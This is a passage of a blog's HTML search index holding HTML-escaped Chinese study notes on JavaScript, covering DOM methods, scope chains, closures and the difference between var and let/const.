&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;contains方法&#34;&gt;contains()方法&lt;/h3&gt;
&lt;p&gt;检测某个节点是不是另一个节点的后代&lt;/p&gt;
&lt;p&gt;调用 contains()方法的应该是祖先节点，这个方法接收一个参数，即要检测的后代节点。&lt;/p&gt;
&lt;p&gt;如果被检测的节点是后代节点， 该方法返回 true；否则，返回 false。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;alert(document.documentElement.contains(document.body)); //true&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;插入文本&#34;&gt;插入文本&lt;/h3&gt;
&lt;h4 id=&#34;innertext&#34;&gt;&lt;code&gt;innerText&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;在通过 innerText 读取值时，它会按照由浅入深的顺序，将子文档树中的所有文本拼接起来。&lt;/p&gt;
&lt;p&gt;在通过 innerText 写入值时，结果会删除元素的所有子节点，插入包含相应文本值的文本节点。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt; 
 &amp;lt;p&amp;gt;This is a &amp;lt;strong&amp;gt;paragraph&amp;lt;/strong&amp;gt; with a list following it.&amp;lt;/p&amp;gt; 
 &amp;lt;ul&amp;gt; 
 &amp;lt;li&amp;gt;Item 1&amp;lt;/li&amp;gt; 
 &amp;lt;li&amp;gt;Item 2&amp;lt;/li&amp;gt; 
 &amp;lt;li&amp;gt;Item 3&amp;lt;/li&amp;gt; 
 &amp;lt;/ul&amp;gt; 
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其 innerText 属性会返回下列字符串：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;This is a paragraph with a list following it. 
Item 1 
Item 2 
Item 3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再设置内容后&lt;/p&gt;
&lt;p&gt;&lt;code&gt;div.innerText = &amp;quot;Hello world!&amp;quot;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;页面的 HTML 代码就会变成如下所示，子节点全被移除了&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;Hello world!&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h4 id=&#34;outertext&#34;&gt;&lt;code&gt;outerText&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;除了作用范围扩大到了包含调用它的节点之外，outerText 与 innerText 基本上没有多大区别。&lt;/p&gt;
&lt;p&gt;多了的就是替代当前调用节点&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;滚动&#34;&gt;滚动&lt;/h3&gt;
&lt;p&gt;下面列出 的几个方法都是对 HTMLElement 类型的扩展&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;scrollIntoViewIfNeeded(alignCenter)：只在当前元素在视口中不可见的情况下，才滚 动浏览器窗口或容器元素，最终让它可见。如果当前元素在视口中可见，这个方法什么也不做。 如果将可选的 alignCenter 参数设置为 true，则表示尽量将元素显示在视口中部（垂直方向）。 Safari 和 Chrome 实现了这个方法。&lt;/li&gt;
&lt;li&gt;scrollByLines(lineCount)：将元素的内容滚动指定的行高，lineCount 值可以是正值， 也可以是负值。Safari 和 Chrome 实现了这个方法。&lt;/li&gt;
&lt;li&gt;scrollByPages(pageCount)：将元素的内容滚动指定的页面高度，具体高度由元素的高度决 定。Safari 和 Chrome 实现了这个方法。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//将页面主体滚动 5 行
document.body.scrollByLines(5); 

//在当前元素不可见的时候，让它进入浏览器的视口
document.images[0].scrollIntoViewIfNeeded(); 

//将页面主体往回滚动 1 页
document.body.scrollByPages(-1); 
&lt;/code&gt;&lt;/pre&gt;
">DOM拓展</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/shen-ru-zuo-yong-yu-lian/"" data-c="
          &lt;p&gt;&lt;strong&gt;什么是作⽤域链？&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function bar() {
console.log(myName)
}
function foo() {
var myName = &amp;quot;极客邦&amp;quot;
bar()
}
var myName = &amp;quot;极客时间&amp;quot;
foo()

&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628416965516.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;​	&lt;br&gt;&lt;/p&gt;
&lt;h2 id=&#34;作用域链&#34;&gt;作⽤域链&lt;/h2&gt;
&lt;p&gt;在每个执⾏上下⽂的变量环境中，都包含了⼀个外部引⽤，⽤来指向外部的执⾏上下⽂，我们把这个外 部引⽤称为outer。&lt;/p&gt;
&lt;p&gt;当⼀段代码使⽤了⼀个变量时，JavaScript引擎⾸先会在“当前的执⾏上下⽂”中查找该变量&lt;/p&gt;
&lt;p&gt;如果在当前的变量环境中没有查找到，那么JavaScript引擎会继 续在outer所指向的执⾏上下⽂中查找。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628416960694.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;bar函数和foo函数的outer都是指向全局上下⽂的&lt;/p&gt;
&lt;p&gt;JavaScript引擎会去全局执⾏上下⽂中查找。我们把这个查找的链条就称为&lt;strong&gt;作⽤域链&lt;/strong&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;foo函数调⽤的bar函数，那为什 么bar函数的外部引⽤是全局执⾏上下⽂，⽽不是foo函数的执⾏上下⽂？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;foo和bar的上级作⽤域都是全局作⽤域（&lt;strong&gt;定义为函数的时候绝对，如果把bar定义在foo里面，那么bar的上级作用域就指向foo&lt;/strong&gt;），所以如果foo或者bar函数使⽤了⼀个它 们没有定义的变量，那么它们会到全局作⽤域去查找&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;词法作⽤域是代码阶段就决定好的，和函数是怎么调⽤的没有关系。&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;词法作用域&#34;&gt;词法作⽤域&lt;/h2&gt;
&lt;p&gt;词法作⽤域就是指作⽤域是由代码中函数声明的位置来决定的，所以词法作⽤域是静态的作⽤域，通过它就 能够预测代码在执⾏过程中如何查找标识符。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628416955034.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;词法作⽤域就是根据代码的位置来决定的，其中main函数包含了bar函数，bar函数中包 含了foo函数&lt;/p&gt;
&lt;p&gt;因为JavaScript作⽤域链是由词法作⽤域决定的，所以整个词法作⽤域链的顺序是：foo函数 作⽤域—&amp;gt;bar函数作⽤域—&amp;gt;main函数作⽤域—&amp;gt;全局作⽤域。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;闭包&#34;&gt;闭包&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;	  function foo() {
    var myName = &amp;quot;极客时间&amp;quot;
    let test1 = 1
    const test2 = 2
    var innerBar = {
      getName: function () {
        console.log(test1)
        return myName
      },
      setName: function (newName) {
        myName = newName
      }
    }
    return innerBar
  }

  var bar = foo()
  bar.setName(&amp;quot;极客邦&amp;quot;)
  bar.getName()
  console.log(bar.getName())
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当执⾏到foo函数内部的return innerBar这⾏代码时调⽤栈的情况&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628416949439.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;根据词法作⽤域的规则，内部函数getName和setName总是可以访问它们的外部函数foo中的变量&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;虽然foo函数已经执⾏结束，但是getName和setName函数依然可 以使⽤foo函数中的变量myName和test1&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628416943836.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;foo函数执⾏完成之后，其执⾏上下⽂从栈顶弹出了，但是由于返回的setName和 getName⽅法中使⽤了foo函数内部的变量myName和test1，所以这两个变量依然保存在内存中。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;内部函数 总是可以访问其外部函数中声明的变量，即使该外部函数已 经执⾏结束了，但是内部函数引⽤外部函数的变量依然保存在内存中，我们就把这些变量的集合称为闭包。&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;闭包是怎么回收的&#34;&gt;闭包是怎么回收的&lt;/h2&gt;
&lt;p&gt;因为如果闭包使⽤不正确，会很容易造成&lt;strong&gt;内存泄漏&lt;/strong&gt;的&lt;/p&gt;
&lt;p&gt;如果引⽤闭包的函数是个局部变量，等函数销毁后，在下次JavaScript引擎执⾏垃圾回收时，判断闭包这块 内容如果已经不再被使⽤了，那么JavaScript引擎的垃圾回收器就会回收这块内存。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;思考题&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var bar = {
myName:&amp;quot;time.geekbang.com&amp;quot;,
printName: function () {
console.log(myName)
}
}

function foo() {
let myName = &amp;quot;极客时间&amp;quot;
return bar.printName
}

let myName = &amp;quot;极客邦&amp;quot;
let _printName = foo()
_printName()
bar.printName()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;打印两次 &lt;strong&gt;极客邦&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;bar 不是⼀个函数，因此 bar 当中的 &lt;strong&gt;printName 其实是⼀个全局声明的函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;bar 当中的 myName 只 是对象的⼀个属性，也和 printName 没有联系，如果要产⽣联系，需要使⽤ this 关键字&lt;/p&gt;
&lt;p&gt;printName函数定义时的执⾏上下⽂是全局，所以会在全局词法环境和变量环境下找myName。&lt;/p&gt;
&lt;p&gt;foo 函数返回的 printName 是全局声明的函数，因此和 foo 当中定义的变量也没有任何联系，这个时 候 foo 函数返回 printName 并不会产⽣闭包&lt;/p&gt;
&lt;p&gt;​&lt;/p&gt;
">深入作用域链</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/var-que-xian-yi-ji-wei-shi-me-yao-yin-let-he-const/"" data-c="
          &lt;h2 id=&#34;作用域scope&#34;&gt;作⽤域（scope）&lt;/h2&gt;
&lt;p&gt;作⽤域是指在程序中定义变量的区域，该位置决定了变量的⽣命周期。&lt;/p&gt;
&lt;p&gt;作⽤域就是变量与函数 的可访问范围，即作⽤域控制着变量和函数的可⻅性和⽣命周期。&lt;/p&gt;
&lt;p&gt;ES6之前，ES的作⽤域只有两种：&lt;strong&gt;全局作⽤域和函数作⽤域&lt;/strong&gt;，是不⽀持块级作⽤域的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;全局作⽤域&lt;/strong&gt;中的对象在代码中的任何地⽅都能访问，其⽣命周期伴随着⻚⾯的⽣命周期。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;函数作⽤域&lt;/strong&gt;就是在函数内部定义的变量或者函数，并且定义的变量或者函数只能在函数内部被访问。函数 执⾏结束之后，函数内部定义的变量会被销毁。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;变量提升带来的问题&#34;&gt;变量提升带来的问题&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function foo(){
for (var i = 0; i &amp;lt; 7; i++) {
}
console.log(i);
}
foo()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为&lt;code&gt;for&lt;/code&gt;循环对于var声明的变量是全局的，所以会一直存在，最后打印出7&lt;/p&gt;
&lt;p&gt;而&lt;code&gt;let&lt;/code&gt;和&lt;code&gt;const&lt;/code&gt;可以避免这样的问题&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;javascript是如何支持块级作用域的&#34;&gt;JavaScript是如何⽀持块级作⽤域的&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function foo(){
var a = 1
let b = 2
{
let b = 3
var c = 4
let d = 5
console.log(a)
console.log(b)
}
console.log(b)
console.log(c)
console.log(d)
}
foo()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;let关键字是如何影响执⾏上下⽂的呢？&lt;/p&gt;
&lt;p&gt;第⼀步是编译并创建执⾏上下⽂&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628341839271.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;当进⼊函数的作⽤域块时，作⽤域块中通过let声明的变量，会被存放在词法环境的⼀个 单独的区域中，这个区域中的变量并不影响作⽤域块外⾯的变量，⽐如在作⽤域外⾯声明了变量b，在该作 ⽤域块内部也声明了变量b，当执⾏到作⽤域内部时，它们都是独⽴的存在。&lt;/p&gt;
&lt;p&gt;在词法环境内部，维护了⼀个⼩型栈结构，栈底是函数最外层的变量，进⼊⼀个作⽤域块后，就会把 该作⽤域块内部的变量压到栈顶；&lt;/p&gt;
&lt;p&gt;当作⽤域执⾏完成之后，该作⽤域的信息就会从栈顶弹出，这就是词法环 境的结构。&lt;/p&gt;
&lt;p&gt;当执⾏到作⽤域块中的console.log(a)这⾏代码时，就需要在&lt;strong&gt;词法环境&lt;/strong&gt;和&lt;strong&gt;变量环境&lt;/strong&gt;中查找变 量a的值了&lt;/p&gt;
&lt;p&gt;沿着词法环境的栈顶向下查询，如果在&lt;strong&gt;词法环境&lt;/strong&gt;中的某个块中查找到了，就 直接返回给JavaScript引擎，如果没有查找到，那么继续在&lt;strong&gt;变量环境&lt;/strong&gt;中查找。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1628341844493.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;思考题&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let myname= &#39;极客时间&#39;
{
console.log(myname)
let myname= &#39;极客邦&#39;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当不在块级作用域声明变量的时候，代码会正常执行&lt;/p&gt;
&lt;p&gt;当在块级作用域里面声明的时候，会因为let声明的变量在编译阶段会被加⼊执⾏上下⽂的词法环境，⽽且不会被提升到作⽤域的顶部而报错&lt;/p&gt;
">var缺陷以及为什么要引⼊let和const？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/dom-new/"" data-c="
          &lt;p&gt;DOM（文档对象模型）是针对 HTML 和 XML 文档的一个 API&lt;/p&gt;
&lt;p&gt;DOM 可以将任何 HTML 或 XML 文档描绘成一个由多层节点构成的结构。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;html&amp;gt;&lt;/code&gt;元素 称之为&lt;strong&gt;文档元素&lt;/strong&gt;，文档元素是文档的最外层元素&lt;/p&gt;
&lt;h2 id=&#34;node类型&#34;&gt;Node类型&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;DOM1 级定义了一个 Node 接口，该接口将由 DOM 中的所有节点类型实现&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;JavaScript 中的所有节点类型都继承自 Node 类型，因此所有节点类型都共享着相同的基本属性和方法。&lt;/p&gt;
&lt;p&gt;每个节点都有一个 nodeType 属性，用于表明节点的类型。会以数值的方式打印出来&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Node.ELEMENT_NODE；&lt;/li&gt;
&lt;li&gt;Node.ATTRIBUTE_NODE；&lt;/li&gt;
&lt;li&gt;Node.TEXT_NODE；&lt;/li&gt;
&lt;li&gt;Node.CDATA_SECTION_NODE；&lt;/li&gt;
&lt;li&gt;Node.ENTITY_REFERENCE_NODE；&lt;/li&gt;
&lt;li&gt;Node.ENTITY_NODE；&lt;/li&gt;
&lt;li&gt;Node.PROCESSING_INSTRUCTION_NODE；&lt;/li&gt;
&lt;li&gt;Node.COMMENT_NODE；&lt;/li&gt;
&lt;li&gt;Node.DOCUMENT_NODE；&lt;/li&gt;
&lt;li&gt;Node.DOCUMENT_TYPE_NODE；&lt;/li&gt;
&lt;li&gt;Node.DOCUMENT_FRAGMENT_NODE；&lt;/li&gt;
&lt;li&gt;Node.NOTATION_NODE。&lt;/li&gt;
&lt;/ol&gt;
&lt;br&gt;
&lt;h3 id=&#34;nodename和-nodevalue属性&#34;&gt;&lt;code&gt;nodeName&lt;/code&gt;和 &lt;code&gt;nodeValue&lt;/code&gt;属性&lt;/h3&gt;
&lt;p&gt;对于元素节点，nodeName 中保存的始终都是元素的标签名，而 nodeValue 的值则始终为 null&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;节点关系&#34;&gt;节点关系&lt;/h3&gt;
&lt;p&gt;每个节点都有一个 &lt;strong&gt;&lt;code&gt;childNodes&lt;/code&gt;&lt;/strong&gt; 属性，其中保存着一个 NodeList 对象。&lt;/p&gt;
&lt;p&gt;NodeList 是一种类数组 对象，用于保存一组有序的节点，可以通过位置来访问这些节点。NodeList 是动态的，随节点变化变化。&lt;/p&gt;
&lt;p&gt;访问NodeList 对象可以通过方括号，也可以使用 item() 方法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var firstChild = someNode.childNodes[0]; 
var secondChild = someNode.childNodes.item(1); 
var count = someNode.childNodes.length; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对 arguments 对象使用 Array.prototype.slice()方法可以 将其转换为数组&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var arrayOfNodes = Array.prototype.slice.call(someNode.childNodes,0);
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;每个节点都有一个 &lt;strong&gt;&lt;code&gt;parentNode&lt;/code&gt;&lt;/strong&gt; 属性，该属性指向文档树中的父节点。&lt;/p&gt;
&lt;p&gt;通过使用列表中每个节点的 &lt;strong&gt;&lt;code&gt;previousSibling&lt;/code&gt;&lt;/strong&gt; 和 &lt;strong&gt;&lt;code&gt;nextSibling&lt;/code&gt;&lt;/strong&gt; 属性，可以访问同一列表中的其他节点&lt;/p&gt;
&lt;p&gt;列表中第一个节点的 previousSibling 属性 值为 null，而列表中最后一个节点的 nextSibling 属性的值同样也为 null&lt;/p&gt;
&lt;p&gt;&lt;code&gt;hasChildNodes()&lt;/code&gt;这个方法在节点包含一或多个子节点的情况下返回 true&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;操作节点&#34;&gt;操作节点&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;appendChild()&lt;/code&gt;用于向 childNodes 列表的末尾添加一个节点，更新完成后，appendChild() 返回新增的节点&lt;/p&gt;
&lt;p&gt;如果传入到 &lt;code&gt;appendChild()&lt;/code&gt;中的节点已经是文档的一部分了，那结果就是将该节点从原来的位置 转移到新位置。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;insertBefore()&lt;/code&gt;接受两个参数：&lt;strong&gt;要插入的节点&lt;/strong&gt;和&lt;strong&gt;作为参照的节点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;插入节点后，被插 入的节点会变成参照节点的前一个同胞节点（previousSibling），同时被方法返回。&lt;/p&gt;
&lt;p&gt;如果参照节点是 null，则 insertBefore()与 appendChild()执行相同的操作&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//插入后成为最后一个子节点
returnedNode = someNode.insertBefore(newNode, null); 
alert(newNode == someNode.lastChild); //true 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;replaceChild()&lt;/code&gt;接受的两个参数：&lt;strong&gt;要插入的节点&lt;/strong&gt;和&lt;strong&gt;要替换的节点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;要替换的节点将由这个 方法返回并从文档树中被移除，同时由要插入的节点占据其位置。&lt;strong&gt;被替换的节点仍然还在文档中，但它在文档中已经没有了自己的位置。&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//替换第一个子节点
var returnedNode = someNode.replaceChild(newNode, someNode.firstChild); 

//替换最后一个子节点
returnedNode = someNode.replaceChild(newNode, someNode.lastChild); 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;removeChild()&lt;/code&gt;接受一个参数：&lt;strong&gt;要移除的节点&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//移除第一个子节点
var formerFirstChild = someNode.removeChild(someNode.firstChild); 

//移除最后一个子节点
var formerLastChild = someNode.removeChild(someNode.lastChild);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;通过 removeChild()移除的节点仍然为文档所有，只不过在 文档中已经没有了自己的位置&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;其他方法&#34;&gt;其他方法&lt;/h3&gt;
&lt;p&gt;有两个方法是所有类型的节点都有的&lt;/p&gt;
&lt;p&gt;第一个就是 &lt;strong&gt;&lt;code&gt;cloneNode()&lt;/code&gt;&lt;/strong&gt;，用于创建调用这个方法的节点 的一个完全相同的副本。&lt;/p&gt;
&lt;p&gt;cloneNode()方法接受一个布尔值参数，表示是否执行深复制。&lt;/p&gt;
&lt;p&gt;在参数为 true 的情况下，执行深复制，也就是&lt;strong&gt;复制节点及其整个子节点树&lt;/strong&gt;；&lt;/p&gt;
&lt;p&gt;在参数为 false 的情况下，执行浅复制， 即&lt;strong&gt;只复制节点本身&lt;/strong&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;ul&amp;gt; 
 &amp;lt;li&amp;gt;item 1&amp;lt;/li&amp;gt; 
 &amp;lt;li&amp;gt;item 2&amp;lt;/li&amp;gt; 
 &amp;lt;li&amp;gt;item 3&amp;lt;/li&amp;gt; 
&amp;lt;/ul&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var myList=document.getElementsByTagName(&#39;ul&#39;)[0]

//深复制 复制了ul自己下面的所有子节点
var deepList = myList.cloneNode(true); 
alert(deepList.childNodes.length);

//浅复制 只复制ul一个本身元素 子节点没有复制
var shallowList = myList.cloneNode(false); 
alert(shallowList.childNodes.length); //0 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;第二个方法是**&lt;code&gt;normalize()&lt;/code&gt;**，这个方法唯一的作用就是处理文档树中的文本节点&lt;/p&gt;
&lt;p&gt;如果找到了 空文本节点，则删除它；如果找到相邻的文本节点，则将它们合并为一个文本节点。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;document类型&#34;&gt;Document类型&lt;/h3&gt;
&lt;p&gt;document 对象是 HTMLDocument（继承 自 Document 类型）的一个实例，表示整个 HTML 页面。&lt;/p&gt;
&lt;p&gt;document 对象是 window 对象的一个 属性，因此可以将其作为全局对象来访问。&lt;/p&gt;
&lt;h3 id=&#34;文档的子节点&#34;&gt;文档的子节点&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;document.documentElement&lt;/code&gt;  取得对&lt;code&gt;&amp;lt;html&amp;gt;&lt;/code&gt;的引用&lt;/p&gt;
&lt;p&gt;&lt;code&gt;document.body&lt;/code&gt; 取得对&lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt;的引用&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;文档信息&#34;&gt;文档信息&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;title&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//取得文档标题
var originalTitle = document.title; 

//设置文档标题
document.title = &amp;quot;New page title&amp;quot;; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;URL&lt;/code&gt;、&lt;code&gt;domain&lt;/code&gt;和 &lt;code&gt;referrer&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;URL&lt;/code&gt;属性 中包含页面完整的 URL&lt;/p&gt;
&lt;p&gt;&lt;code&gt;domain&lt;/code&gt; 属性中只包含页面的域名&lt;/p&gt;
&lt;p&gt;&lt;code&gt;referrer&lt;/code&gt;属性中则保存着链接到当前页面的那个页面的 URL。&lt;/p&gt;
&lt;p&gt;在没有来源页面的情况下，referrer 属性中可能 会包含空字符串。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//取得完整的 URL
var url = document.URL; 

//取得域名
var domain = document.domain; 

//取得来源页面的 URL
var referrer = document.referrer; 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;hr&gt;
&lt;h3 id=&#34;查找元素&#34;&gt;查找元素&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;getElementById()&lt;/code&gt;  ID属性&lt;/p&gt;
&lt;p&gt;&lt;code&gt;getElementsByTagName()&lt;/code&gt;   标签名字  NodeName&lt;/p&gt;
&lt;p&gt;&lt;code&gt;getElementsByName()&lt;/code&gt;   name属性&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;ul&amp;gt; 
 &amp;lt;li&amp;gt;&amp;lt;input type=&amp;quot;radio&amp;quot; value=&amp;quot;red&amp;quot; name=&amp;quot;color&amp;quot; id=&amp;quot;colorRed&amp;quot;&amp;gt; 
 &amp;lt;label for=&amp;quot;colorRed&amp;quot;&amp;gt;Red&amp;lt;/label&amp;gt;&amp;lt;/li&amp;gt; 
 &amp;lt;li&amp;gt;&amp;lt;input type=&amp;quot;radio&amp;quot; value=&amp;quot;green&amp;quot; name=&amp;quot;color&amp;quot; id=&amp;quot;colorGreen&amp;quot;&amp;gt; 
 &amp;lt;label for=&amp;quot;colorGreen&amp;quot;&amp;gt;Green&amp;lt;/label&amp;gt;&amp;lt;/li&amp;gt; 
 &amp;lt;li&amp;gt;&amp;lt;input type=&amp;quot;radio&amp;quot; value=&amp;quot;blue&amp;quot; name=&amp;quot;color&amp;quot; id=&amp;quot;colorBlue&amp;quot;&amp;gt; 
 &amp;lt;label for=&amp;quot;colorBlue&amp;quot;&amp;gt;Blue&amp;lt;/label&amp;gt;&amp;lt;/li&amp;gt; 
 &amp;lt;/ul&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ID 的 作用在于将元素应用到每个单选按钮，&lt;strong&gt;而 name 特性则用以确保三个值中只有一个被发送给浏览器&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;特殊集合&#34;&gt;特殊集合&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;document.anchors，包含文档中所有带 name 特性的元素；&lt;/li&gt;
&lt;li&gt;document.applets，包含文档中所有的元素，因为不再推荐使用元素， 所以这个集合已经不建议使用了；&lt;/li&gt;
&lt;li&gt;document.forms，包含文档中所有的元素，与 document.getElementsByTagName(&amp;quot;form&amp;quot;) 得到的结果相同；&lt;/li&gt;
&lt;li&gt;document.images，包含文档中所有的&lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt;元素，与 document.getElementsByTagName  (&amp;quot;img&amp;quot;)得到的结果相同&lt;/li&gt;
&lt;li&gt;document.links，包含文档中所有带 href 特性的元素&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;文档写入&#34;&gt;文档写入&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;write()&lt;/code&gt;、&lt;code&gt;writeln()&lt;/code&gt;、&lt;code&gt;open()&lt;/code&gt;和 &lt;code&gt;close()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;write()会原样写入，而 writeln()则会 在字符串的末尾添加一个换行符（\n）&lt;/p&gt;
&lt;p&gt;open()和 close()分别用于打开和关闭网页的输出流。&lt;/p&gt;
&lt;br&gt;
&lt;hr&gt;
&lt;h2 id=&#34;element类型&#34;&gt;Element类型&lt;/h2&gt;
&lt;p&gt;Element 类型就要算是 Web 编程中最常用的类型了。&lt;/p&gt;
&lt;p&gt;Element 类型用 于表现 XML 或 HTML元素，提供了对元素标签名、子节点及特性的访问。&lt;/p&gt;
&lt;p&gt;也可以用tagName来获取标签名称&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;myDiv&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/p&gt;
